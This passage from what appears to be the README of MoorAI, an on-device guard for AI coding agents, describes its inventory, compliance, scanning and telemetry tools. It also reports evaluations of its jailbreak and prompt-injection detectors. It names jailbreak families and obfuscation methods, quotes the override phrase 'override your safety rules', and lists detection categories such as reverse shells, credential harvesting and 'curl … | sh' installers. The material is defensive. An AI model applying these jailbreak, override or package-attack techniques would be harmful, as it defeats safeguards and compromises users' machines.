- **`moorai-shadow`** layers a sanctioned/unsanctioned check on top of the AIBOM inventory (allow-list in `~/.moorai/config.json` `sanctioned`, or `MOORAI_SANCTIONED`); `--strict` exits non-zero for CI/posture gates.
- **AIBOM: AI provider keys at rest.** `moorai-aibom` looks for Anthropic, OpenAI, Hugging Face, Perplexity and Google keys (shapes from gitleaks' published rules; a Google key counts only in an AI context, because the same shape is used by Maps and Firebase) in a fixed, bounded set of places. It checks shell startup files (`~/.zshrc`, `~/.zshenv`, `~/.bashrc`, `~/.bash_profile`, `~/.profile`, `~/.config/fish/config.fish`), the config dirs of known AI CLIs (`~/.config/aichat`, `~/.config/shell_gpt`, `~/.config/io.datasette.llm`, `~/.config/fabric`, `~/.config/mods`, `~/.gemini`, `~/Library/Application Support/io.datasette.llm`; depth 2 or less, 25 files or fewer per dir), and `.env` files at the top level of `~` and of each immediate child of `~/code`, `~/src`, `~/dev`, `~/projects`, `~/workspace`, `~/repos`, `~/git` and `~/Developer`. Templates are skipped, and so are files over 1 MB, binary files and unreadable files. It does not walk the disk. Each finding is `{provider, locationClass, location, keyHash}`: `location` is set only for a fixed well-known path (a project `.env` reports none), and `keyHash` is the agent's **keyed**, per-tenant `h2:` hash — the same fingerprint an alert carries — so the console can tell an org-issued key from a personal one. The key, any part of it, and the file contents are never output. An unenrolled device reports `h2:nokey`.
- **AIBOM: running local model servers and local MCP servers.** `moorai-aibom` also reports which local model servers are **running**, not only installed. The probe runs `lsof +c 0 -iTCP -sTCP:LISTEN -nP` + `ps -A -o comm=` on macOS/Linux and `netstat -ano` + `tasklist /FO CSV /NH` on Windows, and keeps only process names and ports; it never reads process arguments or environment. It knows Ollama (process name, or a listener on its documented default port 11434), LM Studio (process name; LM Studio documents no fixed default port), llama.cpp `llama-server` and vLLM (process name; their documented defaults 8080/8000 are too generic to count alone). Each is reported as `{runtime, ports, bind: loopback|network, detectedBy}`. MCP servers declared with a localhost `http(s)` URL in the configs the AIBOM already reads are matched to a listener on that port and reported as `{name, scope, transport: http|sse, port, running}` (`running: null` when the probe could not run). The URL is never echoed, because its query string can carry a token. In `moorai-shadow` these appear as `local-runtime` items (sanction with `sanctioned.runtimes`; a server listening beyond loopback ranks high) and `api-key` items (sanction with `sanctioned.apiKeyHashes`, an exact list of the org's issued keys' `h2:` hashes; `h2:nokey` never sanctions). The desktop host reports both signals to the console too: its device report's `aiAssets` now carries `apiKeysAtRest`, `localRuntimes` and `localMcpListeners` with the same shapes, produced by Rust mirrors of these collectors (`src-tauri/src/ai_keys.rs`, `ai_runtime.rs`, `content_hash.rs`). `test/aibom-rust-parity.test.mjs` pins the Rust tables to the JS ones, and `test/fixtures/content-hash-parity.json` is asserted by both `cargo test` and Node so the host's `keyHash` is byte-identical to the agent's. The console stores them with the rest of `aiAssets` but does not display them yet.
- **AIBOM: MCP server reputation.** `moorai-aibom` reports each MCP server's first-seen reputation (`{score, band, reasons}`, a 0-100 score, band good/fair/poor/bad and category codes such as `mcp-typosquat` or `pkg-install-script-remote`), scored offline from the package name and the copy npx already installed, and counts poor and bad servers in `summary.mcpLowReputation`. `moorai-shadow` carries the same reputation, and an unsanctioned server with a poor or bad band ranks high whatever its inferred scope. The scoring, the opt-in registry lookup and feed, and the `blockBelow` policy are documented in [`mcp-proxy/README.md`](mcp-proxy/README.md).
- **`moorai-compliance`** maps the device's existing content-free signals to framework controls and marks each **covered / partial / not-covered honestly** — the evidence layer a cost-pressured SOC can actually keep. `--format stix` emits the findings as a STIX 2.1 bundle (custom `x-moorai-finding` objects + hash-keyed indicators) for threat-intel interchange.
- **`moorai-verify-chain`** walks each on-device evidence log and verifies its prev-hash chain — a deleted, reordered, or in-place-edited record breaks the chain and is reported. Every log line and every emitted OTel span is chain-stamped (`cli/record-chain.mjs`), so the record hash proves each record and the chain proves the *sequence* (immutable once streamed to your SIEM).
- **`moorai-honeytokens`** registers content-free canaries — a decoy value nobody should ever touch; only its one-way hash is stored, and a later hit is a high-signal alert with zero content at rest.
- **`moorai-attest`** emits the governed record chain as an **in-toto attestation / SLSA provenance predicate**, built only from the content-free fields (tool · category · risk · decision · stage · tenant + the one-way hashes + chain seq/prev/chash) — so an agent's action evidence plugs into the software-supply-chain attestation ecosystem without carrying any content. The AIBOM also exports as a standard **CycloneDX 1.6** or **SPDX 2.3** SBOM (`moorai-aibom --format cyclonedx|spdx`).
- **`moorai-receipt`** emits a signed, content-free **per-verdict decision receipt** — a strict-allowlist payload (tool · category · risk · decision · stage · tenant + the one-way hashes + chain seq/prev/chash), a SHA-256 digest bound only to those fields, and an ed25519 signature from the same per-device agency key as the MCP-approval tokens. `moorai-verify-chain --offline <file>` verifies a receipt (or an in-toto attestation) with **no network** — recomputing the digest to reject tampered payloads and checking the signature against a pinned key. Generation is fail-open (a null signer yields a valid unsigned receipt); verification is fail-closed.
- **`moorai-scan`** is a **pre-install skill gate** — MoorAI's on-device, content-free answer to a cloud "skill scanner". Point it at a skill/agent artifact on disk (a directory, a `SKILL.md`, a `.mcp.json`, a `.claude/agents/*.md`, …) *before* you install it and it walks the path, classifies each file's skill-surface kind (`data/skill-surface.js`), and runs MoorAI's **own shipped detection engine** over each text file at stage `file` (and `tool` for JSON MCP configs). The **verdict is derived from the engine's own allow/ask/deny decisions — never an invented 0-100 score**: any `deny` → `DO-NOT-INSTALL`, any `ask` → `REVIEW`, low findings only → `CAUTION`, nothing → `CLEAN` (the worst across all files). No external scanner is bundled or invoked, and **no enrollment is required** (it runs before you install, possibly before you enroll). Output is JSON (or `--format md`) and is **content-free** — per finding only `{relativePath, surfaceKind, threatId, category, intentLabels, contentHash, tier}`, never the matched text or file contents — so it never becomes the exfiltration channel a cloud scanner is. Exit codes slot into CI: `0` for CLEAN/CAUTION, non-zero for REVIEW/DO-NOT-INSTALL, tunable with `--fail-on <tier>`.

  **Package code (`--packages`, `--package`).** With `--packages`, each MCP server whose config launches a package (`npx`, `pnpm dlx`, `bunx`, `yarn dlx`, `uvx`, `uv tool run`, `pipx run`) is downloaded from the public registry, its digest checked (npm `sha512` integrity, PyPI `sha256`; a mismatch fails closed), extracted into a temporary directory with traversal, link and size guards, and analysed statically — nothing in it is executed. Only the package name and version leave the device, and only with the flag (or `MOORAI_SCAN_PACKAGES=1`); without it the packages are listed as not analysed. Package code gets its own checks — install scripts that download or run remote code, runtime self-install, environment or credential harvesting next to a network send, obfuscated `eval`, socket reverse shells, typosquatted names, known-malicious packages — and the prompt-oriented detectors are scoped by file type: in code and docs they report at most `CAUTION`, because an MCP server spawning processes or calling APIs is expected. `DO-NOT-INSTALL` needs concrete evidence of malicious or unsafe-by-construction behaviour. Docker images and remote-only servers are reported as not analysed.

  **Streamed, so a big package fits in a small container.** The artifact is streamed to a temp file and **hashed while it streams** — the registry digest is still verified end to end, but nothing larger than one archive entry is ever resident. Tarballs are gunzipped through a streaming parser; a zip/wheel is read by offset from the temp file rather than loaded whole. Measured on `npm:n8n-mcp` (a 33 MB tarball, 957 files): **peak RSS 358 MB → 188 MB**, same wall time (~3.9 s). Every temp file is removed in a `finally`, including on an integrity failure or an aborted body. Caps are 128 MB compressed / 512 MB extracted / 10000 entries, each overridable (`MOORAI_SCAN_MAX_ARTIFACT_MB`, `MOORAI_SCAN_MAX_REPO_MB`, `MOORAI_SCAN_MAX_EXTRACT_MB`, `MOORAI_SCAN_MAX_FILE_MB`, `MOORAI_SCAN_MAX_ENTRIES`). An archive over a cap reports `archive-limits-exceeded` and `REVIEW` — an unfinished scan is never reported as a clean one.

  **GitHub source repositories (`--package github:<owner>/<repo>[/<path>][@ref]`).** Many MCP servers are published only as a source repository, with no npm or PyPI package. With a `<path>` this fetches a single skill folder; with **no path it extracts and scans the whole repository**, reporting `ecosystem: "github"`, the resolved commit from the archive's pax header, and `integrity: none` (a git archive carries no registry digest). Only `owner/repo/ref` leaves the device, to `codeload.github.com`. What is not the product is dropped during extraction and never costs a byte of the budget — `.git/`, `node_modules/`, `vendor/`, `.venv/`, `__pycache__/` — while `dist/`, `build/` and `target/` are kept, because checked-in build output ships exactly as a package's `dist/` does. And because a repository carries its tests, examples, docs and its own CI and dev-environment tooling, **block-tier evidence in those paths is reported at `REVIEW` with its path and a `test-code` / `repo-tooling` label, not as a `DO-NOT-INSTALL` verdict** — a published DO-NOT-INSTALL is a public accusation about the product. That rule came from measurement, not taste: `metabase` was a false alarm (a CI test drives git through `pty.spawn`, no socket anywhere) and `posthog` a true `curl … | sh` in an optional developer bootstrap. The same evidence in shipped server code keeps its block tier, pinned by a true-positive twin test.
- **Per-agent behavioral baseline detectors.** On top of the fixed agent signatures, three content-free detectors flag deviation from an actor's *own* established behavior: a **velocity burst** (cadence far above the actor's robust median/IQR), a **confused-deputy pivot** (an injection tell followed by a sensitive action in the same actor's window), and a **fan-out anomaly** (a spawning actor delegating to abnormally many subagents). Features are all hashes/metadata; thresholds are chosen for explainability and not yet tuned against a production distribution.
- **Obfuscation-resistant detection.** A bounded, DoS/ReDoS-capped decode/normalize pre-pass re-runs the detectors over decoded and reversed variants, so **encoded/obfuscated** payloads (base64/hex/rot13/caesar ciphers, reversed text, composed transforms) that defeat plain-text scanning are still caught. All ten HackAgent families — CipherChat, FlipAttack, h4rm3l, DAN, AutoDAN, BoN, AdvPrefix, and the persuasion/multi-turn families **PAP, PAIR, TAP** — are caught by content-free detectors, the last three via a weighted persuasion-tell + crescendo-trajectory analyzer (`data/crescendo.js`). **Measured honestly, and the honest answer depends heavily on how hard the test set is** — we publish both:
  - **Mild paraphrases** (`npm run redteam-eval`, 29 held-out samples, 178-prompt benign corpus): **100% held-out (29/29) at 94% precision (4 FP/178).** Read that as a regression gate, not a generalization claim — a v0.71.0 tuning wave targeted these 29 samples, which burns them as a held-out set. The locked half below is the honest out-of-sample number.
  - **Adversarial mutations** (`node scripts/score-heldout-v2.mjs`, **105 fresh attacks** built by a mutation generator across 29 transformation axes — synonym/voice swaps, directive-in-code-comment/JSON/blockquote indirection, homoglyphs, letter-spacing, caesar/rot13, persona and persuasion recombinations). This set is split into a tune half and a **locked** test half (`scripts/split-heldout-v2.mjs`, stratified by family+axis); detector work may only see the tune half, so the locked half stays a valid measure:

    | | before fixes | after fixes |
    |---|---|---|
    | **Locked test half, deterministic** (never seen during tuning) | 31.8% (14/44) | **86.4% (38/44)** at **100% precision** (0 FP/10) |
    | **Locked test half, full stack** (+ on-device model) | — | **100% (44/44)** at **100% precision** |
    | Tune half | 34.4% (21/61) | 100% (61/61) |

    Precision is measured against a **610-prompt benign corpus** (`test/redteam/benign-corpus-v2.json`, 269 adversarially-shaped hard negatives): **3.32% false-positive rate** (20/602). That rate went **up**, and the reason is the point: 101 deliberately-obfuscated benign samples were added, and before they existed the FP gate could not tell a safe detector apart from one scoring 48 false positives. A harder corpus with a worse number is a better measurement than an easy corpus with a good one.

  The locked half scores **86.4% (38/44)** deterministically and the tune half **100% (61/61)**: that **13.6-point tune/test gap is the overfit margin** — the detectors still fit the phrasings they were tuned on better than fresh ones. Four named overfit root causes — a too-narrow policy-negation vocabulary, a rules-slot that broke on one adjective (`override your safety rules`), no confusable/homoglyph folding, and synonym-blind fuzzy matching — are fixed in the shipped detectors. Weakest on the locked half: TAP (1/3) and PAIR (2/4) by family, and the thought-experiment, leetspeak and multi-turn crescendo axes — those live in the semantic layer, not these detectors. None of this changes the fact that the **action layer** — which blocks the tool call regardless of whether the prompt was ever classified — is the durable control, not prompt detection. An optional **on-device semantic escalation** layer (`--semantic`, a local model, zero egress) recovers most of the residue (~97% held-out in a sampled run) but is opt-in and environment-dependent, so it is not the headline number. `npm run validate-blocking` shows every malicious *tool call* still denied at the hook even after a jailbreak.

### Stream to your SIEM / observability stack — OpenTelemetry, content-free

Point MoorAI at any OTLP collector and every governed decision is exported as an OpenTelemetry span
(GenAI semantic conventions) that Datadog, Dynatrace, Grafana, Elastic, or your SIEM ingest natively —
**but carrying no prompt, response, argument, or file-path content**. Only governance metadata and the
tenant-keyed argument hash leave: `gen_ai.tool.name`, `moorai.category`, `moorai.risk`,
`moorai.decision`, `moorai.args_hash`. A blocked call is an ERROR span, so denials light up in your
existing dashboards. It is the standard telemetry envelope with none of the content — observability you
can pipe into your SIEM without a data-residency problem, and without vendor lock-in.

```bash
export MOORAI_OTLP_ENDPOINT="https://otel-collector.example:4318"   # OTLP/HTTP (JSON) base URL
export MOORAI_OTLP_HEADERS="x-api-key=…"                            # optional ingest headers
```

Off unless an endpoint is set; emission is bounded and best-effort and never affects an enforcement
decision. (Or set `otlpEndpoint` / `otlpHeaders` in the device config.)

## Coverage

| | |
|---|---|
| **Agents** | Claude Code (full hook enforcement) · **Codex CLI, GitHub Copilot CLI, Gemini CLI and Cursor: pre-tool hook enforcement** through `cli/moorai-agent-hook.mjs` (see *Other agents* below) · Claude Desktop · VS Code / Copilot · any project `.mcp.json` consumer (MCP stdio proxy — **enforcement, host-independently**, but only over MCP; see the bound below) |
| **Surfaces** | prompts · AI outputs · files read into context · **files the agent writes or edits** · MCP tool calls · **MCP tool listings and tool results** · **outbound `WebFetch` requests** · **what comes back from `Bash`, MCP tools and sub-agents (Claude Code)** · pasted images (on-device OCR) · the agent's auto-loaded context files (`CLAUDE.md`, `AGENTS.md`, `.mcp.json`, …) · the agent's auto-loaded skill surface (skills, subagents, commands, MCP configs, hook-bearing settings) |
| **Platforms** | macOS · Windows · Linux (on-device OCR is a second-class tier — see below) |
| **Detects** | secrets · PII / PHI · source-code leakage · prompt injection · destructive commands · second-order/hidden-instruction injection · skill-surface poisoning & drift · the agent's rules files leaving the device · risky actions outside the user's stated task · low-reputation MCP servers · MCP tool descriptions that ask for a credential file |

**The bound on host-independent enforcement, stated plainly.** The MCP proxy enforces on any host that
launches a stdio MCP server, in both directions — but MCP is one wire. Measured against a 12-action
malicious set, the proxy refused **12/12** while enforcing (8 by the argument scan, **2 by the result
scan**) and forwarded **4/4** benign actions — yet only **4 of those 12 actions natively traverse MCP at
all**. The other eight reach the machine through a host's own built-in tools, where the Claude Code
PreToolUse hook is the control and the proxy sees nothing. So "host-independent" is true of the mechanism
and narrow in reach; full coverage is still a Claude Code property.

### Image inspection (#23) — where the OCR runs

A pasted screenshot is text as far as policy is concerned, so MoorAI recovers the text and runs it
through the same detectors as any pasted file. That extraction uses **the operating system's own
text-recognition engine**: no model is bundled into the installer, and the image never reaches the
MoorAI console. Honest platform matrix:

| Platform | Engine | Does the image leave the device? |
|---|---|---|
| macOS | `Vision.framework` (`VNRecognizeTextRequest`) — ships with the OS | **No.** Fully on-device. |
| Windows | `Windows.Media.Ocr.OcrEngine` — ships with the OS, needs an OCR **language pack** for a profile language | **No.** Fully on-device. |
| Linux | `Tesseract` via the `leptess` binding (system `libtesseract`, pulled in as a `.deb`/`.rpm` dependency) — **opportunistic, second-class** vs the OS engines | **No.** Fully on-device. |
| Windows with no OCR language pack, or the app opened in a plain browser | none | See below. |

Where the OS provides no engine, MoorAI does **not** fall back to its own servers. If — and only if
— the device already holds an AI provider key (`ANTHROPIC_API_KEY`, the admin key file at
`~/.moorai/provider-key`, or the agent token saved in MoorAI; the same resolution as
[`data/device-inference.mjs`](data/device-inference.mjs)), the app offers a fallback that sends the
image **device → provider directly**, to the provider the developer's own agent already talks to.
That path is disclosed in the UI before it runs and emits a content-free alert so it is visible in
the console. With no engine **and** no key, image inspection is **skipped** and says so — it never
degrades into silent egress.

> The Windows engine is runtime-verified on a real Windows 11 host — `Windows.Media.Ocr` read back
> 8/8 sensitive strings (incl. an AWS key and an SSN) off a clean render. The Linux/Tesseract tier is
> validated end-to-end but **second-class**: accuracy on dense secret strings is below the macOS/Windows
> OS engines, so treat it as opportunistic, not parity.

## Using the engine as a library

The scan engine is importable as a stable API from the `moorai/scan` entry point, so
another app can depend on this repo directly without reaching into internal paths.

Add it as a pinned git dependency:

```bash
npm install github:gitayg/moorai#v0.82.0
```

Then scan a path on-device (findings are content-free — hashes, never the matched text):

```js
import { scanPath } from "moorai/scan";

const result = scanPath("./some-skill");
console.log(result.verdict); // CLEAN | CAUTION | REVIEW | DO-NOT-INSTALL
```

The barrel (`scan.mjs`) re-exports only the public scan surface — `scanPath`,
`scanFileText`, `buildEngine`, `decideText`, `skillIntents`, `contentHash`,
`skillSurfaceKind`, `isSkillSurface`, and the `VERDICTS` / `VERDICT_RANK` /
`decisionToVerdict` / `worseVerdict` / `tierOf` / `jsonStrings` / `NO_KEY` helpers —
so internal files can move without breaking consumers.

## How it works

A small Rust (Tauri) host wraps the agent's terminal; a local webview runs the detection engine. Prompts, file reads, tool calls, and outputs are checked against a 77-threat matrix (17 categories) + content rules + org-defined detector packs — entirely on the device. A separate, proprietary **management console** adds a multi-tenant dashboard, SSO, fleet policy, and content-free compliance exports (AIBOM, EU AI Act records, board AI-readiness report, SIEM streaming). Open-core: this agent is MIT; the console is commercial.

## Learn more

- **Website & comparisons** — [moorai.dev](https://moorai.dev/)
- **How it stacks up** — vs [Lakera](https://moorai.dev/moorai-vs-lakera.html) · [Prompt Security](https://moorai.dev/moorai-vs-sentinelone.html) · [BigID](https://moorai.dev/moorai-vs-bigid.html) · [Harmonic](https://moorai.dev/moorai-vs-harmonic.html) · [Zenity](https://moorai.dev/moorai-vs-zenity.html) · [Netskope](https://moorai.dev/moorai-vs-netskope.html)

## License

The MoorAI community agent is licensed under the [MIT License](LICENSE). The management server is a separate product, source-available under the [Elastic License 2.0](https://www.elastic.co/licensing/elastic-license).
